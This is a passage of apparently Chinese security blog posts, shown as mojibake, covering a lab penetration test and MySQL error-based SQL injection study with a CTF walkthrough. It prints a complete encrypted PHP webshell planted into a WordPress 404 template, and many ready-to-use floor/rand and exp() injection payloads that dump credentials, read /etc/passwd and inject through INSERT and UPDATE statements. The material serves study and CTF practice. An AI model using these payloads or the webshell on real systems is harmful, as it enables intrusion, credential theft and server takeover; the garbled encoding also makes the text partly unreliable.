ï¼Œæ„Ÿè§‰æ˜¯ä¸€èˆ¬æœ‰å·¥ä½œç»„ã€åŸŸç¯å¢ƒçš„éƒ½æ˜¯windowsç³»ç»Ÿï¼Œæˆ–è€…æ˜¯ä¸Šè¿°ä¿¡æ¯ä¸­å·²ç»å¯ä»¥è¯å®ï¼Œä½†æˆ‘å¹¶æœªçœ‹å‡ºæ¥ã€‚ mountå‘½ä»¤å‚è€ƒï¼šLinuxå‘½ä»¤ä¹‹mountå‘½ä»¤ è¿™é‡Œåœ¨è¾“å…¥å‘½ä»¤çš„æ—¶å€™è¿˜è¸©å‘äº†ï¼Œæˆ‘å‘ç°ä¸€ç›´æŠ¥é”™ ä»”ç»†æ¯”å¯¹å‘½ä»¤å‘ç°ï¼Œé‚£ä½å¸ˆå‚…çš„å‘½ä»¤ä¸­çš„å¼•å·æ˜¯ä¸­æ–‡çš„ã€‚ã€‚ã€‚ã€‚å®åœ¨æ˜¯ä¸ç†è§£ï¼ŒçœŸå¥‡æ€ª mount -t cifs -o username=â€™â€™,password=â€™â€™ //192.168.123.206/share$ /mnt #æ­£ç¡® mount -t cifs -o username='',password='' //192.168.123.206/share$ /mnt #æŠ¥é”™ ç°åœ¨æˆ‘ä»¬å¾—åˆ°äº†è¿™äº›æ–‡ä»¶ï¼Œä»”ç»†åˆ†æäº†æ–‡ä»¶åä¼šå‘ç°ï¼Œæˆ‘ä»¬æŒ‚è½½çš„ç›®å½•ä¼¼ä¹å°±æ˜¯å½“å‰çš„webç«™ç‚¹ä¸‹ã€‚ 3.3 æŸ³æš—èŠ±æ˜åˆä¸€æ‘ é€šè¿‡å¯¹å‰é¢webç«™ç‚¹çš„æ‰«æï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å¾—åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä½†æ˜¯é€šè¿‡smbæœåŠ¡ï¼Œæˆ‘ä»¬å‘ç°ç›®æ ‡ç›´æ¥æŒ‚è½½åˆ°äº†ç«™ç‚¹ç›®å½•ã€‚é€šè¿‡å¯¹ç«™ç‚¹ç›®å½•çš„è¯»å–ï¼Œæˆ‘ä»¬é¡ºåˆ©å¾—åˆ°äº†æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨wp-config.phpæ–‡ä»¶ä¸­è¯»å–åˆ°æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç çš„ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å»phpmyadminå°è¯•ç™»å½• æˆåŠŸç™»å½•ï¼Œä½†å½“æƒ³è¿›ä¸€æ­¥æŸ¥è¯¢æ•°æ®åº“çš„æ—¶å€™å‘ç°æƒé™ä¸å¤Ÿã€‚ã€‚ã€‚ éšåé‚£ä½å¸ˆå‚…çŒœæµ‹ï¼Œè¿™ä¸ªè´¦å·ä¹Ÿå¯ä»¥ç™»å½•wpåå°ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹ æˆåŠŸç™»å½•ï¼Œæ¥ä¸‹æ¥çš„æ­¥éª¤æˆ‘å°±å®Œå…¨ä¸çŸ¥é“äº†ï¼Œè·Ÿç€èµ°ä¸€éå§ï¼š æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨wpåå°ï¼Œç‚¹å‡»ç¼–è¾‘404æ¨¡æ¿ã€‚å†™å…¥ä¸€å¥è¯ã€‚ &lt;?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i&lt;strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&amp;15]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?&gt; ä½†è¿™é‡Œä¸çŸ¥é“ä¸ºä½•ä¸€ç›´è¿æ¥ä¸ä¸Šï¼Œæš‚ä¸”å½“ä¸ªæ€è·¯å§ï¼Œæäº†åŠå¤©å¼„ä¸å‡ºæ¥ã€‚ã€‚ã€‚ã€‚ 0x04 å‚è€ƒæ–‡ç«  æµ…è°ˆå¸¸è§æ¸—é€æµ‹è¯•æµç¨‹ å†°è(Behinder)ä¸‹è½½ä¸å®‰è£…ä»¥åŠè¿æ¥æµ‹è¯•","tags":["çº¢é˜Ÿæ¸—é€"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"å†æ¢SQLæŠ¥é”™æ³¨å…¥","path":"/2023/12/14/zai-tan-sql-bao-cuo-zhu-ru/","content":"0x01 å‰è¨€ æœ¬æ–‡çš„äº§ç”Ÿæ˜¯ç”±äºåˆšåˆšåˆ·PentesterLabé¶åœºé‡åˆ°çš„SQLæ³¨å…¥é—®é¢˜ï¼Œå‘ç°è‡ªå·±å¯¹SQLæŠ¥é”™æ³¨å…¥è¿˜æ˜¯æœ‰ä¸€å®šçš„æ¬ ç¼ºï¼Œæ•…æ­¤æ¥å¤ä¹ ä¸€æ³¢ã€‚ 0x02 randå’Œorder byæŠ¥é”™æ³¨å…¥ ä¸€èˆ¬æ„ä¹‰ä¸Šæ¥è¯´ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ˜¾é”™æ³¨å…¥æ‰‹æ®µæ˜¯è¿™ä¸¤ä¸ªï¼Œåœ¨mysqlçš„å®˜æ–¹æ–‡æ¡£ä¸­æœ‰è¿™æ ·ä¸€å¥ RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. è¯‘æ–‡ï¼š æ¯æ¬¡æ‰§è¡Œ WHERE æ—¶ï¼Œéƒ½ä¼šé‡æ–°è®¡ç®— WHERE å­å¥ä¸­çš„ RAND()ã€‚ä¸èƒ½åœ¨ ORDER BY å­å¥ä¸­ä½¿ç”¨å¸¦æœ‰ RAND() å€¼çš„åˆ—ï¼Œå› ä¸º ORDER BY ä¼šå¤šæ¬¡è®¡ç®—è¯¥åˆ—ã€‚ ä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ä½œä¸ºorder byçš„æ¡ä»¶å­—æ®µï¼Œgroup byåŒç†ï¼Œæ‰€ä»¥æœ‰å¦‚ä¸‹payloadï¼š and+1=2+UNION+SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version())))a+from+information_schema.tables+group+by+a)b-- å…¶ä¸­aä¸º: concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version()))) åé¢åˆgroup by aï¼Œæ‰€ä»¥ä¼šçˆ†å‡º Duplicate entry â€˜XXXXXXXXXXâ€™ for key â€˜group_keyâ€™ è¯‘æ–‡ï¼š å¯†é’¥â€œgroup_keyâ€çš„æ¡ç›®â€œXXXXXXXXXXâ€é‡å¤ å…¶ä¸­XXXXXå°±æ˜¯0x5f,database(),0x5f,user(),0x5f,version()çš„å†…å®¹ï¼Œè¿™æ ·ä¸€æ­¥æ­¥å°±èƒ½æ‹¿åˆ°æƒ³è¦çš„ä¿¡æ¯ åœ¨å‰é¢çš„payloadä¸­å…¶å®è¿˜æœ‰ä¸ªå¾ˆé‡è¦çš„å‡½æ•°æ˜¯floor()å–æ•´ï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ç ”ç©¶è¿‡ï¼Œfloor(rand(0)*2)è¿™æ ·ä¼šäº§ç”Ÿé‡å¤çš„éšæœºæ•°ï¼Œä»è€Œåœ¨order byæ—¶å€™æŠ¥é”™ã€‚ æ¥ä¸‹æ¥è¯¦ç»†åˆ†æä¸€æ³¢ä¸Šè¿°payloadçš„åŸç†ï¼š Floorï¼ˆï¼‰å‡½æ•° floorï¼ˆï¼‰ï¼Œrandï¼ˆï¼‰ï¼Œcountï¼ˆï¼‰ï¼Œgroup byè”åˆä½¿ç”¨ï¼š floorï¼ˆï¼‰ï¼šå‘ä¸‹å–æ•´ randï¼ˆï¼‰ï¼šç”Ÿæˆä¸€ä¸ª0-1ä¹‹é—´çš„éšæœºæ•°ï¼Œä¸åŒ…æ‹¬0å’Œ1 countï¼ˆ*ï¼‰ï¼šç»Ÿè®¡æŸä¸ªè¡¨ä¸‹é¢ä¸€å…±æœ‰å¤šå°‘è®°å½• group by XXXï¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™å¯¹XXXè¿›è¡Œæ’åº æŠ¥é”™åŸç†ï¼šgroup byå’Œrandï¼ˆï¼‰è”åˆä½¿ç”¨çš„æ—¶å€™ï¼Œå¦‚æœä¸´æ—¶è¡¨ä¸­æ²¡æœ‰è¯¥ä¸»é”®ï¼Œåˆ™å†æ’å…¥çš„ä¹‹å‰ä¼šå†è®¡ç®—ä¸€æ¬¡randï¼ˆï¼‰ï¼Œç„¶åå†ç”±group byå°†è®¡ç®—å‡ºæ¥çš„ä¸»é”®ç›´æ¥æ’å…¥åˆ°ä¸´æ—¶è¡¨æ ¼ä¹‹ä¸­ï¼Œå¯¼è‡´ä¸»é”®é‡å¤ï¼Œç„¶åæŠ¥é”™ã€‚ ä¸Šè¿°æ˜¯è¿™äº›å‡½æ•°çš„ç®€å•ç”¨æ³•ï¼Œä»¥ä¸‹ä¸æƒ³è´¹åŠ²æ­ç¯å¢ƒäº†ï¼Œç›´æ¥ç…§æ¬å¸ˆå‚…çš„äº†ã€‚ã€‚ã€‚ åœ¨è¿™é‡Œä½¿ç”¨group byçš„æ—¶å€™å›ç”Ÿæˆä¸€å¼ ä¸´æ—¶è¡¨ï¼Œä¹Ÿå«åšè™šæ‹Ÿè¡¨ï¼Œè€Œä¸”è¡¨éƒ½æ˜¯æœ‰ä¸»é”®çš„ï¼Œä½œä¸ºä¸»é”®çš„åˆ—æ˜¯ä¸èƒ½ç”±é‡å¤çš„ï¼Œå¥½æ¯”ç¬¬ä¸€ä¸ªå€¼çš„ä¸»é”®ä¸º1ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å†æœ‰ä¸»é”®ä¸º1çš„å€¼äº†ï¼Œæ¥ä¸‹æ¥å¯ä»¥å†æ˜¯2ã€3â€¦ å¯ä»¥çœ‹åˆ°ä¸Šè¿°ä¸¤å¹…å›¾ç‰‡ä¸­ç¬¬äºŒå¹…å›¾ç‰‡çš„åºåˆ—æ˜æ˜¾æ›´è§„å¾‹ï¼ˆä¹Ÿå°±æ˜¯ä¼ªåºåˆ—ï¼‰ é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œè‡ªç„¶å°±æœ‰ä¸»é”®ã€‚å½“ä½¿ç”¨group byå»è¯»è¿™äº›æ•°æ®çš„æ—¶å€™ï¼Œå¥½æ¯”ä¸Šé¢è¿™ä¸ªä¼ªéšæœºåºåˆ—ï¼Œè¯»å®Œç¬¬ä¸€åˆ—ï¼Œå‘ç°ä¸»é”®ä¹‹ä¸­æ²¡æœ‰0è¿™ä¸ªæ•°å­—ï¼Œä½†ç”±äºrandçš„å­˜åœ¨ï¼Œä»–ä¸ä¼šç«‹åˆ»æ’å…¥ï¼Œè€Œæ˜¯ä¼šç»§ç»­è¿ç®—ä¸€æ¬¡randå‡½æ•°ï¼Œç„¶åç»è¿‡floorä¹‹å0å˜æˆäº†1ï¼Œéšåç‡å…ˆæ’å…¥çš„æ•°å­—ä¾¿æˆäº†1ã€‚ç„¶åå–ç¬¬äºŒæ¡æ•°æ®ï¼Œæ­¤æ—¶floorä¹‹åä¸ºæ•°å­—1ï¼Œä½†è¯¥è™šæ‹Ÿè¡¨ä¸­å·²ç»æœ‰äº†1ï¼Œåˆ™è¯¥æ•°å­—1å¯¹åº”çš„å€¼è‡ªå¢1ï¼Œç»§ç»­ä»fromçš„è¡¨ä¸­å–ç¬¬ä¸‰æ¡è®°å½•ï¼Œå†æ¬¡è®¡ç®—floor(rand(0)*2)ï¼Œç»“æœä¸º0ï¼Œç”±äºè¡¨ä¸­ä¸å­˜åœ¨æ•°å­—0ï¼Œåˆ™ç»§ç»­randä¸€æ¬¡ï¼Œç»è¿‡floorä¹‹åæˆäº†1ï¼Œä½†æ ¹æ®ç‰¹æ€§ï¼Œè¯¥æ•°å­—1ä¼šç¡¬æ’å…¥è¯¥è™šæ‹Ÿè¡¨ä¸­ï¼Œå¯¼è‡´äº†æ•°å­—1çš„é‡å¤ï¼Œæœ€ç»ˆæŠ¥é”™ è¿™é‡Œæ˜¯ä¸ªä¾‹å­ï¼Œå°†userï¼ˆï¼‰çš„ä½ç½®æ¢åšåˆ«çš„ï¼Œå°±å¯ä»¥æ˜¾ç¤ºå‡ºåˆ«çš„é”™è¯¯äº†ã€‚ çˆ†åº“ï¼š å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„securityï¼Œåé¢çš„æ•°å­—1æ˜¯randï¼ˆï¼‰å‡½æ•°äº§ç”Ÿçš„ã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°å…·ä½“ä¿¡æ¯äº†ã€‚å…¶å®å°±æ˜¯åˆ©ç”¨äº†countçš„ç»Ÿè®¡ä¸group byçš„åˆä½œï¼Œç„¶ååŸºäºä¸»é”®å”¯ä¸€çš„æœºåˆ¶ï¼Œç„¶åé€ æˆäº†è¿™ä¸ªé”™è¯¯ã€‚ æ¨¡æ¿payloadå¤§è‡´å¦‚ä¸‹ï¼š ?id=1 and 1=2 UNION SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(0x5f,database(),0x5f,user(),0x5f,version())))a from information_schema.tables group by a)b; #ç¬¬ä¸€ç§ ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+ #ç¬¬äºŒç§ ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b)--+ #ç¬¬äºŒç§ ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select user()))x from information_schema.tables group by x)b)--+ uname=hybcx&amp;passwd=1' union select count(*),concat((select concat(username,0x7e,password)from users),floor(rand(0)*2))x from information_schema.columns group by x#&amp;submit=Submit #ç¬¬ä¸‰ç§ åªéœ€å°†ä¸Šé¢æ¨¡æ¿ä¸­çš„å†…å®¹æ›¿æ¢æˆä¸ºæˆ‘ä»¬çš„æŸ¥è¯¢payloadå³å¯ï¼Œaä¸bå‡æ˜¯å­—æ®µåˆ«å 0x03 EXPå‡½æ•°æŠ¥é”™æ³¨å…¥ ä½œç”¨ï¼šè®¡ç®—ä»¥eä¸ºåº•çš„å¹‚å€¼ è¯­æ³•ï¼šexpï¼ˆXï¼‰ æŠ¥é”™åŸç†ï¼šå½“å‚æ•°Xè¶…è¿‡äº†710ä¹‹åï¼Œexpå‡½æ•°å°±ä¼šæŠ¥é”™ã€‚ MySQLä¸­çš„EXP()å‡½æ•°ç”¨äºå°†Eæå‡ä¸ºæŒ‡å®šæ•°å­—Xçš„å¹‚ï¼Œè¿™é‡ŒE(2.718281 â€¦)æ˜¯è‡ªç„¶å¯¹æ•°çš„åº•æ•°ã€‚ è¯¥å‡½æ•°å¯ä»¥ç”¨æ¥è¿›è¡Œ MySQL æŠ¥é”™æ³¨å…¥ã€‚ä½†æ˜¯ä¸ºä»€ä¹ˆä¼šæŠ¥é”™å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œæ¬¡æ–¹åˆ°åè¾¹æ¯å¢åŠ  1ï¼Œå…¶ç»“æœéƒ½å°†è·¨åº¦æå¤§ï¼Œè€Œ MySQL èƒ½è®°å½•çš„ Double æ•°å€¼èŒƒå›´æœ‰é™ï¼Œä¸€æ—¦ç»“æœè¶…è¿‡èŒƒå›´ï¼Œåˆ™è¯¥å‡½æ•°æŠ¥é”™ã€‚è¿™ä¸ªèŒƒå›´çš„æé™æ˜¯ 709ï¼Œå½“ä¼ é€’ä¸€ä¸ªå¤§äº 709 çš„å€¼æ—¶ï¼Œå‡½æ•° exp() å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯ï¼š é™¤äº† exp() ä¹‹å¤–ï¼Œè¿˜æœ‰ç±»ä¼¼ pow() ä¹‹ç±»çš„ç›¸ä¼¼å‡½æ•°åŒæ ·æ˜¯å¯åˆ©ç”¨çš„ï¼Œä»–ä»¬çš„åŸç†ç›¸åŒã€‚ ä½¿ç”¨ç‰ˆæœ¬ï¼šMySQL5.5.5 åŠä»¥ä¸Šç‰ˆæœ¬ ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“å½“ä¼ é€’ä¸€ä¸ªå¤§äº 709 çš„å€¼æ—¶ï¼Œå‡½æ•° exp() å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨å®é™…åˆ©ç”¨ä¸­å¦‚ä½•è®© exp() æŠ¥é”™çš„åŒæ—¶è¿”å›æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„æ•°æ®å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥ç”¨ ~ è¿ç®—ç¬¦æŒ‰ä½å–åçš„æ–¹å¼å¾—åˆ°ä¸€ä¸ªæœ€å¤§å€¼ï¼Œè¯¥è¿ç®—ç¬¦ä¹Ÿå¯ä»¥å¤„ç†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡å…¶å¤„ç†çš„å­—ç¬¦ä¸²ä¼šå˜æˆå¤§ä¸€ä¸ªå¾ˆå¤§æ•´æ•°è¶³ä»¥è¶…è¿‡ MySQL çš„ Double æ•°ç»„èŒƒå›´ï¼Œä»è€ŒæŠ¥é”™è¾“å‡ºï¼š å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæŠ¥é”™å¹¶è¾“å‡ºäº†æ•°æ®ã€‚ä½†æ˜¯äº‹å®è¯æ˜ï¼Œåœ¨ MySQL&gt;=5.5.53 ä¹‹åï¼Œexp() æŠ¥é”™ä¸èƒ½è¿”å›æˆ‘ä»¬çš„æŸ¥è¯¢ç»“æœï¼Œè€Œåªä¼šå¾—åˆ°ä¸€ä¸ªæŠ¥é”™ï¼š ä¸‹é¢ç”±äºå®æ“çš„æ—¶å€™åœ¨å®‰è£…MySQLä½ç‰ˆæœ¬æ€»æ˜¯æŠ¥é”™ï¼Œæˆ‘å°±ç›´æ¥ç…§æ¬äº†ï¼ˆè§è°…~ï¼‰ æ³¨å‡ºæ•°æ® å¾—åˆ°è¡¨åï¼š mysql&gt; select exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'flag,users' from dual)))' å¾—åˆ°åˆ—åï¼š mysql&gt; select exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='users')x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'id,username,password' from dual)))' æ£€ç´¢æ•°æ®ï¼š mysql&gt; select exp(~ (select*from(select group_concat(id, 0x7c, username, 0x7c, password) from users)x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1|admin|123456,2|whoami|657260,3|bunny|864379' from dual)))' è¯»å–æ–‡ä»¶ï¼ˆæœ‰13è¡Œçš„é™åˆ¶ï¼‰ï¼š mysql&gt; select exp(~(select * from(select load_file('/etc/passwd'))x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' from dual)))' è¿™ä¸ªæŸ¥è¯¢å¯ä»¥ä»å½“å‰çš„ä¸Šä¸‹æ–‡ä¸­ dump å‡ºæ‰€æœ‰çš„ tables ä¸ columnsï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ dump å‡ºæ‰€æœ‰çš„æ•°æ®åº“ï¼Œä½†ç”±äºæˆ‘ä»¬æ˜¯é€šè¿‡æŠ¥é”™æ¥è·å–ï¼Œå› æ­¤å®ƒè¿”å›çš„ç»“æœæœ‰é™ï¼š mysql&gt; select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000 ctf::flag::id ctf::flag::flag ctf::users::id ctf::users::username ctf::users::password' from dual)))' é‚£å¯¹äºè¿™ä¸ªpayloadæˆ‘æœ‰æ‰€ç–‘æƒ‘ï¼Œå› æ­¤æˆ‘è¯¢é—®äº†GPTï¼ˆå…¶ä¸­çš„@ç¬¦å·çš„ä½œç”¨ï¼‰ select exp(~(select*from(select(concat(@:=0,(select count(*)from information_schema.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)); åœ¨è¿™ä¸ª SQL æŸ¥è¯¢è¯­å¥ä¸­ï¼š @:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name) @ æ˜¯ä¸€ä¸ªç”¨æˆ·å˜é‡ï¼Œç”¨äºå­˜å‚¨ä¸­é—´ç»“æœã€‚åœ¨è¿™é‡Œï¼Œ@ çš„ä½œç”¨æ˜¯åœ¨ä¸åŒçš„æ­¥éª¤ä¸­ä¿ç•™ä¸­é—´æ‹¼æ¥çš„å­—ç¬¦ä¸²ã€‚ è®©æˆ‘è§£é‡Šä¸€ä¸‹ï¼š @:=0ï¼šè¿™æ˜¯ä¸€ä¸ªåˆå§‹åŒ–æ­¥éª¤ï¼Œå°†ç”¨æˆ·å˜é‡ @ è®¾ç½®ä¸ºé›¶ã€‚ @:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)ï¼šåœ¨è¿™ä¸€æ­¥ï¼Œconcat å‡½æ•°ç”¨äºå°†å½“å‰çš„ @ å€¼ä¸æ–°çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç„¶åå°†ç»“æœå†æ¬¡å­˜å‚¨åœ¨ @ å˜é‡ä¸­ã€‚è¿™æ ·ï¼Œ@ å˜é‡é€æ¸è¢«æ„å»ºèµ·æ¥ï¼ŒåŒ…å«äº†å¤šæ¬¡æ‹¼æ¥çš„ç»“æœã€‚ å®é™…ä¸Šï¼Œè¿™ä¸¤ä¸ª @ ç¬¦å·æ˜¯åŒä¸€ä¸ªç”¨æˆ·å˜é‡ï¼Œåªæ˜¯åœ¨ä¸åŒçš„æ—¶åˆ»è¢«ä½¿ç”¨ã€‚ç¬¬ä¸€ä¸ª @ æ˜¯åœ¨åˆå§‹åŒ–æ—¶ä½¿ç”¨ï¼Œè€Œåç»­çš„ @ æ˜¯åœ¨æ‹¼æ¥å­—ç¬¦ä¸²æ—¶ä½¿ç”¨ï¼Œç”¨äºä¿ç•™ä¸­é—´ç»“æœã€‚ Insertä½ç½®æ³¨å…¥ æ ¹æ® Insert ä½ç½®çš„æ³¨å…¥æ–¹å¼æŒ‰éƒ¨å°±ç­å°±å¥½äº†ã€‚å‡è®¾åŸæ¥çš„æ’å…¥è¯­å¥å¦‚ä¸‹ï¼š insert into users(id,username,password) values(4,'john','679237'); æˆ‘ä»¬å¯ä»¥åœ¨ username æˆ– password ä½ç½®æ’å…¥æ¶æ„çš„ exp() è¯­å¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š # åœ¨usernameå¤„æ’å…¥: john' or exp(~(select * from(select user())x)),1);#, åˆ™sqlè¯­å¥ä¸º: insert into users(id,username,password) values(4,'john' or exp(~(select * from(select user())x)),1);#','679237'); mysql&gt; insert into users(id,username,password) values(4,'john' or exp(~(select * from(select user())x)),1);#','679237');; ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))' çˆ†å‡ºæ‰€æœ‰æ•°æ®ï¼š # åœ¨usernameå¤„æ’å…¥: john' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);# mysql&gt; insert into users(id,username,password) values(4,'john' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)),1);#','679237'); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000 ctf::flag::id ctf::flag::flag ctf::users::id ctf::users::username ctf::users::password' from dual)))' Updateä½ç½®æ³¨å…¥ æ ¹æ® Update ä½ç½®çš„æ³¨å…¥æ–¹å¼æŒ‰éƒ¨å°±ç­å°±å¥½äº†ã€‚å‡è®¾åŸæ¥çš„æ’å…¥è¯­å¥å¦‚ä¸‹ï¼š update users set password='new_value' WHERE username = 'admin'; æˆ‘ä»¬å¯ä»¥åœ¨ new_value æˆ–åé¢çš„ where å­å¥å¤„æ’å…¥æ¶æ„çš„ exp() è¯­å¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š # åœ¨new_valueå¤„æ’å…¥: abc' or exp(~(select * from(select user())x))#, åˆ™sqlè¯­å¥ä¸º: update users set password='abc' or exp(~(select * from(select user())x))# WHERE username = 'admin'; mysql&gt; update users set password='abc' or exp(~(select * from(select user())x));# WHERE username = 'admin'; ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))' exp() å‡½æ•°è¿›è¡Œç›²æ³¨ æœ‰çš„ç™»å½•é€»è¾‘ä¼šæ ¹æ® sql è¯­å¥çš„æŠ¥é”™ä¸å¦è¿”å›ä¸åŒçš„ç»“æœï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™é‡Œå¾—æŠ¥é”™çš„è¯ä¾¿å¯ä»¥è¿›è¡Œç›²æ³¨ã€‚ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€ä¸ª CTF ä¾‹é¢˜æ¥è¿›è¡Œè¯¦ç»†æ¢ç©¶ã€‚ 2021 è™ç¬¦æ¯ CTF Finalweb Hatenum è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼šï¼ˆå¯¹æˆ‘æ¥è¯´æœ‰ç‚¹éš¾åº¦ï¼Œåªèƒ½åŸºæœ¬æŠ„wpäº†ï¼‰ æˆ‘ä»¬å…ˆåˆ†æä¸€æ³¢é¢˜ç›®ç»™çš„æºç  home.php &lt;?php require_once('config.php'); if(!$_SESSION['username']){ header('location:index.php'); } if($_SESSION['username']=='admin'){ echo file_get_contents('/flag'); } else{ echo 'hello '.$_SESSION['username']; } ?&gt; è¿™é‡Œè¯´å¦‚æœæˆ‘ä»¬å­˜å‚¨åœ¨sessionå˜é‡ä¸­çš„username=adminçš„è¯å°±ç»™flag config.php &lt;?php error_reporting(0); session_start(); class User{ //æ•°æ®åº“é…ç½®ä¿¡æ¯ public $host = \"localhost\"; public $user = \"root\"; public $pass = \"123456\"; public $database = \"ctf\"; public $conn; function __construct(){ //è¿›è¡Œæ•°æ®åº“è¿æ¥ $this-&gt;conn = new mysqli($this-&gt;host,$this-&gt;user,$this-&gt;pass,$this-&gt;database); if(mysqli_connect_errno()){ die('connect error'); } } //æŸ¥è¯¢ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åæ˜¯å¦åœ¨æ•°æ®åº“ä¸­ function find($username){ $res = $this-&gt;conn-&gt;query(\"select * from users where username='$username'\"); if($res-&gt;num_rows&gt;0){ return True; } else{ return False; } } //æ³¨å†ŒåŠŸèƒ½éƒ¨åˆ† function register($username,$password,$code){ if($this-&gt;conn-&gt;query(\"insert into users (username,password,code) values ('$username','$password','$code')\")){ return True; } else{ return False; } } //å¦‚æœæŸ¥è¯¢åˆ°å¯¹åº”ç”¨æˆ·åï¼Œåˆ™æˆåŠŸç™»å½• function login($username,$password,$code){ $res = $this-&gt;conn-&gt;query(\"select * from users where username='$username' and password='$password'\"); if($this-&gt;conn-&gt;error){ return 'error'; } else{ $content = $res-&gt;fetch_array(); if($content['code']===$_POST['code']){ $_SESSION['username'] = $content['username']; return 'success'; } else{ return 'fail'; } } } } //è¿›è¡Œäº†å¾ˆæœ‰åŠ›çš„è¿‡æ»¤ï¼Œä¸è¿‡æ²¡æœ‰è¿‡æ»¤\\ä¸() function sql_waf($str){ if(preg_match('/union|select|or|and|\\'|\"|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r| |\\t|substr|right|left|mid/i', $str)){ die('Hack detected'); } } function num_waf($str){ if(preg_match('/\\d{9}|0x[0-9a-f]{9}/i',$str)){ die('Huge num detected'); } } function array_waf($arr){ foreach ($arr as $key =&gt; $value) { if(is_array($value)){ array_waf($value); } else{ sql_waf($value); num_waf($value); } } } 